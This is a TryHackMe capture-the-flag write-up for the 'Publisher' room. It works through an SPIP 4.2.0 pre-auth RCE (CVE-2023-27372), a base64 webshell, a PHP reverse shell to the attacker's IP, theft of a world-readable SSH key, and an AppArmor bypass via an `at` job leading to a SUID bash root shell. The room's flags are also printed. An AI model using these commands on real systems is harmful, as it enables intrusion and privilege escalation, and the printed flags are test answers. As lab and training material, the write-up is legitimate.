# 📰 Publisher

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com/room/publisher)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com/room/publisher)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com/room/publisher)
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com/room/publisher)

---

## 📋 Overview

> **On difficulty rating:** This room is labeled "Easy" — that is flatly wrong, and reading the official writeup after rooting only makes it worse.
>
> The room description does drop a hint: *"necessitating a deeper exploration into the system's security profile to ultimately exploit a loophole that enables the execution of an unconfined bash shell."* Fine — in hindsight, that points at the author's intended method: invoking the dynamic linker directly to escape AppArmor confinement:
> ```
> /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash
> ```
> Knowing that the ELF dynamic loader can be used to spawn a shell outside an AppArmor profile is not something that belongs in an "Easy" box. That is a deep, obscure technique that most players — including experienced ones — would not reach for without prior exposure. The hint in the room description is too vague to be useful in the moment; it only makes sense in retrospect once you already know the answer.
>
> This box was rooted via `at` job scheduling to bypass AppArmor confinement — a valid alternate path arrived at through 80% reasoning and intuition with no meaningful guidance from the room. The "Easy" label wasted time, created false doubt, and sent enumeration down dead ends. Whether the intended path or not, neither solution is "Easy" by any reasonable standard. The difficulty tag needed to be Medium at minimum. Authors owe players an honest label — not one that sets them up to question their own ability when the real problem is the rating.

| Field | Details |
|---|---|
| **Target** | `publisher` / `10.48.138.132` |
| **OS** | Ubuntu 20.04 |
| **Attack Surface** | SPIP 4.2.0 unauthenticated RCE (CVE-2023-27372), world-readable SSH private key |
| **Privesc** | AppArmor bypass via `at` job → SUID `run_container` script injection → root |

*Privesc path was worked out through my own intuition and brainstorming with Claude — particularly around using `strace` to trace the SUID binary and the `at` job approach to escape AppArmor confinement.*

Publisher hosts an outdated SPIP 4.2.0 CMS with a critical pre-auth RCE. A public PoC exploits PHP object injection in the password reset form, dropping a webshell into the SPIP root — which lives inside a Docker container in `think`'s home directory. `think`'s SSH private key is world-readable inside the container, granting direct SSH access to the host. On the host, a custom SUID binary runs a world-writable script as root — but AppArmor blocks `think` from writing to it directly. Scheduling the overwrite via `at` sidesteps the confined shell context, the SUID binary executes the poisoned script, and `/bin/bash` gets SUID.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sC -sV -sT -v -p- -oA tcpscan-publisher publisher
sudo nmap -sU -vv -oA udpscan-publisher publisher
```

```
22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp open  http  Apache httpd 2.4.41
```

UDP came up empty — `68/udp` (dhcpc) and `5353/udp` (zeroconf) both `open|filtered`, nothing actionable.

### Directory Bruteforce

```bash
ffuf -u http://publisher/FUZZ -w ./Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -fc 403
```

```
images   [Status: 301]
spip     [Status: 301]
```

`/spip` is a SPIP CMS installation. Fuzzing inside it:

```bash
ffuf -u http://publisher/spip/FUZZ -w ./Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -fc 403
```

```
local    [Status: 301]
vendor   [Status: 301]
config   [Status: 301]
tmp      [Status: 301]
IMG      [Status: 301]
ecrire   [Status: 301]
prive    [Status: 301]
```

### SPIP Version Fingerprinting

The login page at `/spip/spip.php?page=login` leaks the version in its HTML:

```html
<meta name="generator" content="SPIP 4.2.0" />
```

### SQLite Database Leak

`/spip/config/bases/` is browsable. The SPIP database is directly downloadable:

```bash
wget http://publisher/spip/config/bases/spip.sqlite
sqlite3 spip.sqlite
```

```
sqlite> .tables
spip_articles   spip_auteurs   spip_meta   spip_forum   spip_urls   ...
```

The database exposes the full schema and content. SQLmap against the `recherche` parameter came up dry — no injectable parameters detected.

---

## 💀 Initial Access — CVE-2023-27372 SPIP RCE

SPIP < 4.2.1 is vulnerable to unauthenticated remote code execution via PHP object injection in the `oubli` parameter of the password reset form. The serialised payload is deserialised server-side without sanitisation, allowing arbitrary PHP execution.

**CVE:** CVE-2023-27372  
**CVSS:** 9.8 (Critical)  
**Reference:** [EDB-51536](https://www.exploit-db.com/exploits/51536)

### Exploit

Used the [0SPwn PoC](https://github.com/0SPwn/CVE-2023-27372-PoC/blob/main/exploit.py), which exploits the same injection primitive to drop a webshell into the SPIP web root:

```bash
# Webshell content: <?php system($_GET["cmd"]); ?>
echo PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==|base64 -d > shell.php
```

After running the exploit, the shell lands in the SPIP installation root (which sits inside a Docker container at `/home/think/spip/spip/`):

```
-rw-rw-rw- 1 www-data www-data 31 Apr 20 18:45 shell.php
```

### Reverse Shell

```bash
# Trigger the shell via cmd parameter (URL-encoded PHP fsockopen one-liner)
curl "http://publisher/spip/shell.php?cmd=php%20-r%20%27%24sock%3Dfsockopen(%22192.168.240.231%22%2C80)%3Bshell_exec(%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22)%3B%27"
```

```bash
# Listener
sudo nc -nlvp 80
```

```
connect to [192.168.240.231] from (UNKNOWN) [10.48.138.132] 44616
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Shell lands inside a Docker container (`hostname: 41c976e507f8`).

### Shell Stabilisation

```bash
script /dev/null -c bash
# ctrl+z
stty raw -echo; fg
export TERM=xterm
stty rows 52 cols 188
```

### SSH Key Leak

Enumerating files owned by `think` reveals an unprotected private key:

```bash
find / -type f -user think 2>/dev/null | xargs ls -lah
```

```
-rw-r--r-- 1 think think 2.6K Jan 10  2024 /home/think/.ssh/id_rsa
-rw-r--r-- 1 think think  569 Jan 10  2024 /home/think/.ssh/id_rsa.pub
```

World-readable, unencrypted. Copy it out and SSH directly to the host:

```bash
chmod 600 id_rsa
ssh -i id_rsa think@publisher
```

```
think@ip-10-48-138-132:~$ id
uid=1000(think) gid=1000(think) groups=1000(think)
```

### User Flag

```bash
cat /home/think/user.txt
```

```
fa229046d44eda6a3598c73ad96f4ca5
```

---

## 🔁 Privilege Escalation — AppArmor Bypass + SUID `run_container`

### SUID Enumeration

```bash
find / -perm -4000 2>/dev/null | xargs ls -lah
```

```
-rwsr-sr-x 1 root root 17K Nov 14  2023 /usr/sbin/run_container
```

Non-standard SUID binary. Tracing its execution path:

```bash
strace /usr/sbin/run_container 2>&1 | grep -i run_container
```

```
execve("/usr/sbin/run_container", ["/usr/sbin/run_container"], ...)
execve("/bin/bash", ["/bin/bash", "-p", "/opt/run_container.sh"], NULL)
openat(AT_FDCWD, "/opt/run_container.sh", O_RDONLY) = 3
stat("/opt/run_container.sh", {st_mode=S_IFREG|0777, ...})
```

`run_container` calls `/bin/bash -p /opt/run_container.sh` — privileged execution of a script with these permissions:

```bash
ls -lah /opt/run_container.sh
```

```
-rwxrwxrwx 1 root root 1.7K Jan 10  2024 /opt/run_container.sh
```

World-writable. If `think` can overwrite it, the next `run_container` call executes arbitrary code as root.

### AppArmor Restriction

Direct writes are blocked:

```bash
echo 'chmod +s /bin/bash' > /opt/run_container.sh
# -ash: /opt/run_container.sh: Permission denied
```

AppArmor is active (`aa-status` confirms the module is loaded). A profile confines `think`'s shell context and blocks writes to that path, even though POSIX permissions allow it.

### Bypass via `at`

The `at` daemon executes scheduled jobs through `/bin/sh` in a process context outside the AppArmor profile applied to `think`'s interactive shell. Scheduling the overwrite via `at` sidesteps confinement.

Worth noting: AppArmor's restrictions extended beyond just `/opt/run_container.sh` — `vi` and standard text editors were also blocked under `think`'s context, so even building the injection script required using `echo >>` to append line by line rather than opening an editor:

```bash
echo '#!/bin/bash' >> /var/tmp/inject.sh
echo 'echo "chmod +s /bin/bash" > /opt/run_container.sh' >> /var/tmp/inject.sh
chmod +x /var/tmp/inject.sh

cat /var/tmp/inject.sh
# #!/bin/bash
# echo "chmod +s /bin/bash" > /opt/run_container.sh
```

```bash
at now -f /var/tmp/inject.sh
# warning: commands will be executed using /bin/sh
# job 1 at Mon Apr 20 19:56:00 2026
```

After the job runs, the script is overwritten:

```bash
tail -1 /opt/run_container.sh
# chmod +s /bin/bash
```

### Root

```bash
/usr/sbin/run_container
ls -lah /bin/bash
```

```
-rwsr-sr-x 1 root root 1.2M Apr 18  2022 /bin/bash
```

```bash
/bin/bash -p
bash-5.0# cat /root/root.txt
3a4225cc9e85709adda6ef55d6a4f2ca
```

---

## 🗺️ Attack Chain

```
[Port 80 — Apache / SPIP 4.2.0]
    ffuf → /spip/ discovered
    meta generator tag → SPIP 4.2.0 identified
    /spip/config/bases/spip.sqlite → downloadable (open directory)
          │
          ▼
[CVE-2023-27372 — Unauthenticated RCE]
    PHP object injection via oubli parameter (password reset form)
    webshell dropped to /home/think/spip/spip/shell.php
    PHP reverse shell → www-data (Docker container: 41c976e507f8)
          │
          ▼
[SSH Key Leak — Inside Container]
    /home/think/.ssh/id_rsa world-readable (perms: 644)
    copy key → SSH to host as think
          │
          ▼
[AppArmor Bypass + SUID run_container]
    /usr/sbin/run_container (SUID root) → executes /opt/run_container.sh
    /opt/run_container.sh world-writable but AppArmor blocks direct write
    vi also blocked → script built via echo >> to work around confinement
    at job runs outside confined context → overwrites script
    run_container executes poisoned script as root → chmod +s /bin/bash
    /bin/bash -p → euid=0 → root
```

---

## 📌 Key Takeaways

- Exposed CMS version strings (meta generator tags) short-circuit recon — always check page source before reaching for heavier tools
- SPIP's `oubli` deserialization path is a textbook pre-auth RCE; vendor-managed CMSes need aggressive patch cadence, not just installation and forget
- Private keys with world-readable permissions (`644`) are as good as no protection — `chmod 600` is non-negotiable on any key material
- AppArmor profiles restrict by process context, not just file permissions — `vi` being blocked is a strong hint the profile is broad; when editors fail, fall back to `echo >>` and reach for `at`/`cron` to escape the confined context
- The author's intended bypass was invoking the ELF dynamic loader directly (`/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /bin/bash`) to spawn a shell outside AppArmor confinement — worth keeping in the toolkit alongside `at` and `cron` as an immediate, non-scheduled alternative
- World-writable scripts called by SUID binaries are an instant root path if you can write by any means; POSIX permissions alone are not sufficient protection when MAC (AppArmor/SELinux) is inconsistently applied

---

## 🎯 MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Exploit Public-Facing Application | [T1190](https://attack.mitre.org/techniques/T1190) |
| Execution | Command and Scripting Interpreter: Unix Shell | [T1059.004](https://attack.mitre.org/techniques/T1059/004) |
| Credential Access | Unsecured Credentials: Private Keys | [T1552.004](https://attack.mitre.org/techniques/T1552/004) |
| Lateral Movement | Remote Services: SSH | [T1021.004](https://attack.mitre.org/techniques/T1021/004) |
| Privilege Escalation | Scheduled Task/Job: At | [T1053.001](https://attack.mitre.org/techniques/T1053/001) |
| Privilege Escalation | Abuse Elevation Control Mechanism: Setuid and Setgid | [T1548.001](https://attack.mitre.org/techniques/T1548/001) |
| Defense Evasion | Impair Defenses: Disable or Modify Tools | [T1562.001](https://attack.mitre.org/techniques/T1562/001) |

---

## 🛠️ Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | TCP and UDP port/service enumeration |
| `ffuf` | Directory bruteforce to discover `/spip/` and sub-paths |
| `wget` | Download SPIP SQLite database |
| `sqlite3` | Inspect downloaded database schema |
| `sqlmap` | SQL injection testing (negative result) |
| `CVE-2023-27372 PoC` | Drop webshell via SPIP PHP object injection |
| `nc` | Reverse shell listener |
| `script` | Shell stabilisation |
| `strace` | Trace `run_container` to reveal script execution path |
| `at` | Schedule script overwrite outside AppArmor context |
| `ssh` | Access host as `think` using leaked private key |

---

## 🚩 Flags

<details>
<summary><code>user.txt</code></summary>

`fa229046d44eda6a3598c73ad96f4ca5`

</details>

<details>
<summary><code>root.txt</code></summary>

`3a4225cc9e85709adda6ef55d6a4f2ca`

</details>
